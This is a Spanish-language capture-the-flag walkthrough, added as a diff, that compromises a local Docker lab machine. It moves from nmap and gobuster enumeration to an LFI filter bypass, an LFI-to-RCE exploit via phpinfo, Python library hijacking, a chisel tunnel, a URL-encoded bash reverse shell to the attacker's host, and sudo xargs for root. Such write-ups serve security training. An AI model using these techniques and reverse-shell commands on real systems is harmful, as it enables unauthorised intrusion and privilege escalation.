@@ -1,0 +1,270 @@
+# Enumeracion de Puertos, Servicios y Versiones
+
+nmap -Pn -n -sS -p- -sV --script 'vuln' --min-rate 5000 -vvv 172.17.0.2 -oN nmap
+
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
+| vulners: 
+|   cpe:/a:apache:http_server:2.4.58: 
+|     	CVE-2024-38476	9.8	https://vulners.com/cve/CVE-2024-38476
+|     	CVE-2024-38474	9.8	https://vulners.com/cve/CVE-2024-38474
+|     	CVE-2024-38475	9.1	https://vulners.com/cve/CVE-2024-38475
+|     	0486EBEE-F207-570A-9AD8-33269E72220A	9.1	https://vulners.com/githubexploit/0486EBEE-F207-570A-9AD8-33269E72220A	*EXPLOIT*
+|     	B0A9E5E8-7CCC-5984-9922-A89F11D6BF38	8.2	https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38	*EXPLOIT*
+|     	CVE-2024-40898	7.5	https://vulners.com/cve/CVE-2024-40898
+|     	CVE-2024-39573	7.5	https://vulners.com/cve/CVE-2024-39573
+|     	CVE-2024-38477	7.5	https://vulners.com/cve/CVE-2024-38477
+|     	CVE-2024-27316	7.5	https://vulners.com/cve/CVE-2024-27316
+|     	B5E74010-A082-5ECE-AB37-623A5B33FE7D	7.5	https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D	*EXPLOIT*
+|_    	45D138AD-BEC6-552A-91EA-8816914CA7F4	7.5	https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4	*EXPLOIT*
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
+|_http-jsonp-detection: Couldn't find any JSONP endpoints.
+| http-enum: 
+|_  /info.php: Possible information file
+
+
+
+# Fuzzing Web
+
+gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,html,py,js,png,jpg -t 100 -b 404
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 275]
+/info.php             (Status: 200) [Size: 72824]
+/index.html           (Status: 200) [Size: 925]
+/.html                (Status: 403) [Size: 275]
+/idol.html            (Status: 200) [Size: 6494]
+/.html                (Status: 403) [Size: 275]
+/.php                 (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+Progress: 1661144 / 1661152 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+chequeamos http://17.17.0.2 y no hay nada de interes, revisamos 
+el codigo fuente y lo mismo.
+
+cheamos /info.php y nos conseguimos con una plantilla php con 
+informacion de configuraciones y demas.. pero nada que nos pueda
+ayudar por ahora..
+
+chequeo si consigo un LFI sobre /info.php pero nada, sin resultados..
+
+asi que me voy a /idol.html y bajando por la web conseguimos un boton
+llamado DarkNet que si clikcamos sobre el nos lleva a http://172.17.0.2/clouddev3lopmentfile.php
+
+y vemos el siguiente mensaje: Error: No se ha especificado un archivo para incluir
+
+por lo que sobre este directorio buscare si es vulnerable a un LFI
+
+
+wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.17.0.2/clouddev3lopmentfile.php?FUZZ=../../../../../etc/passwd" --hh 53
+
+000023351:   200        0 L      0 W        0 Ch        "filename"                                                                           
+
+
+y vemos que es vulnerable a un LFI
+
+por lo que ahora probaremos a que archivos del sistema podriamos acceder
+
+wfuzz -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.17.0.2/clouddev3lopmentfile.php?filename=FUZZ" --hh 0
+
+y hemos conseguido muchos resultados, pero tras probarlos, vemos que las entradas estan sanitizadas, por lo que intentaremos 
+saltarnos la sanitizacion de la siguiente forma:
+
+
+http://172.17.0.2/clouddev3lopmentfile.php?filename=....//....//....//....//....//etc//passwd
+
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+s4vitar:x:1001:1001:s4vitar,189,,:/home/s4vitar:/bin/bash
+xerosec:x:1002:1002:xerosec,,,:/home/xerosec:/bin/bash
+mario:x:1003:1003:mario,,,:/home/mario:/bin/bash
+
+
+y hemos logrado conseguir leer archivos, intente acceder de esta forma a los logs de apache pero recibimos el mensaje:
+Esto no va de envenenamientos !!!
+
+asi que si buscamos en internet nos conseguimos con un LFI2RCE via phpinfo() que indica:
+
+Para explotar esta vulnerabilidad necesitas: Una vulnerabilidad LFI, una página donde se 
+muestre phpinfo(), "file_uploads = on" y el servidor debe poder escribir en el directorio "/tmp".
+
+el LFI lo tenemos, ahora vamos a verificar lo demas en /info.php
+
+verificamos si file_upload = on se cumple, asi que nos vamos a http://172.17.0.2/info.php 
+y filtramos por file_uploads y nos conseguimos que esta habilitado: file_uploads	On	On
+
+asi que nos descargamos de github un exploit: https://github.com/mikaelkall/HackingAllTheThings/blob/master/lfi/phpinfolfi.py
+
+una vez descargado, debemos adaptarlo a nuestro caso, asi que lo editamos de la siguiente manera:
+
+__________________________________________________________________________________________________________________________
+$ip = '192.168.1.189';			|Aqui vamos a colocar nuestra IP como atacante
+$port = 4444;				|configuramos el puerto por el cual vamos a estar escuchando con netcat
+
+>>buscamos la variable REQ1 y hacemos que apunte a /info.php, quedando asi:
+
+REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
+
+>>buscamos la variable LFIREQ y hacemos que apunte a la vulnerabilidad LFI que tenemos
+
+antes:
+LFIREQ="""GET /index.php?file=%s HTTP/1.1\r
+
+despues:
+LFIREQ="""GET /clouddev3lopmentfile.php?filename=....//....//....//....//....//=%s HTTP/1.1\r
+___________________________________________________________________________________________________________________________
+
+ahora vamos a ponernos en escucha con netcat por el puerto configuraado en el exploit
+
+nc -lnvp 4444
+
+y ejecutamos el exploit pasandole como parametros la ip y el puerto
+
+python2 phpinfolfi.py 172.17.0.2 80
+Don't forget to modify the LFI URL
+LFI With PHPInfo()
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Getting initial offset... found [tmp_name] at 114226
+Spawning worker pool (10)...
+ 1000 /  1000
+:(
+Shuttin' down...
+___________________________________________
+
+si volvemos a netcat, hemos recibido la reverse shell
+
+# Escalada de Privilegios
+
+script /dev/null -c bash 
+
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+sudo -l								|solicita password
+find / -perm -4000 2>/dev/null					|nada por aqui
+find / -type f -name '*.txt' 2>&1 |grep -v Permission
+/home/NotaParaMario.txt
+
+-----------------------------------------------------------------
+Hola Mario!
+Acuerdate de revisar el script conjunto que estamos desarrollando 
+parar la comunidad! Lo he movido al directorio tmp
+
+megustaelfallout
+
+Borra esta nota cuando la leas.
+-----------------------------------------------------------------
+
+al leer esta nota hay algo como raro: megustaelfallout
+asi que lo probamos contra los usuarios del sistema y 
+resulta ser la clave del user: xerosec
+
+su xerosec
+pass:megustaelfallout
+sudo -l
+    (mario) NOPASSWD: /usr/bin/python3 /tmp/script.py
+
+si chequeamos los permisos, no podemos editar el script, leemos el 
+script:
+_________________________________________________________
+import hashlib
+
+if __name__ == '__main__':
+    cadena = input("Introduce la cadena: ")
+    hash_md5 = hashlib.md5(cadena.encode()).hexdigest()
+    print("El hash MD5 de la cadena es:", hash_md5)
+_________________________________________________________
+
+como vemos que esta importando el modulo hashlib, podemos crear uno 
+en /tmp para que sea a este el que exporte y ejecute y es alli donde
+vamos a ejecutar comandos como mario
+
+echo "import subprocess; subprocess.run('/bin/bash', shell=True)" > hashlib.py
+
+con esto creamos el modulo que va a llmar el script del user mario, con el objetivo
+de que podemos escalar, asi que ya creado el hashlib.py ejecutamos el script.py
+como mario
+
+sudo -u mario /usr/bin/python3 /tmp/script.py
+
+_____________________________
+ahora somos el usuario mario
+
+en el directorio de mario se encuentra un txt que al leerlo:
+
+-----------------------------------------------------------
+Acordarme de usar la sintaxis index.php?cmds4vi=id para 
+ejecutar comandos en el server http de S4vitar
+-----------------------------------------------------------
+
+por lo que chequeamos los procesos y encontramos:
+
+ps aux 
+s4vitar       36  0.0  0.1 200576 22824 ?        Ss   Sep13   0:01 php -S localhost:9999
+
+el user s4vitar tiene un server levantado por el puerto 9999 y segun podemos ejecutar comandos
+con la sintaxis index.php?cmds4vi=id, asi que vamos a intentarlo
+
+curl http://localhost:9999/index.php?cmds4vi=id
+uid=1001(s4vitar) gid=1001(s4vitar) groups=1001(s4vitar),100(users)
+
+
+tenemos ejecucion de comandos, pero intentamos enviar una reverse shell y no funciona
+asi que vamos a pasar chisel desde nuestra maquina para poder acceder desde nuestro navegador
+al puerto 9999
+
+----------------------------------------------------------------
+desde nuestra maquina atacante ejecutamos chisel como server:
+./chisel server --reverse -p 90
+----------------------------------------------------------------
+desde mario ejecutamos chisel como cliente:
+./chisel client 172.17.0.1:90 R:7000:localhost:9999
+
+redireccionamos el puerto 9999 (donde corre el servidor de s4vitar)
+al puerto 7000 de nuestra maquina atacante
+----------------------------------------------------------------
+
+si vamos al server chisel en nuestra maquina podemos observar:
+2024/09/13 20:28:37 server: session#4: tun: proxy#R:7000=>localhost:9999: Listening
+
+ahora podremos ver desde el puerto 7000 de nuestra maquina lo que corre en el puerto 9999
+por lo que nos vamos al navegar y colocamos: 
+
+http://localhost:7000/
+
+_______________________________
+No se ha pasado ningun comando.|
+-------------------------------
+
+ahora nos enviaremos una reverse shell desde la url, por lo que nos ponemos en escucha 
+con netcat en nuestra maquina atacante:
+
+nc -lnvp 4445
+
+
+ahora enviamos la reverse shell desde el navegador:
+
+debemos urlencodear: bash -c "/bin/bash -i >& /dev/tcp/172.17.0.1/4445 0>&1"
+para pasarlo como comando, quedaria asi:
+
+http://localhost:7000/index.php?cmds4vi=%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%37%32%2e%31%37%2e%30%2e%31%2f%34%34%34%35%20%30%3e%26%31%22
+
+
+nos vamos a Netcat y hemos recibido la conexion, por lo que somos el user s4vitar
+
+sudo -l
+    (root) NOPASSWD: /usr/bin/xargs
+
+sudo /usr/bin/xargs -a /dev/null bash
+#root
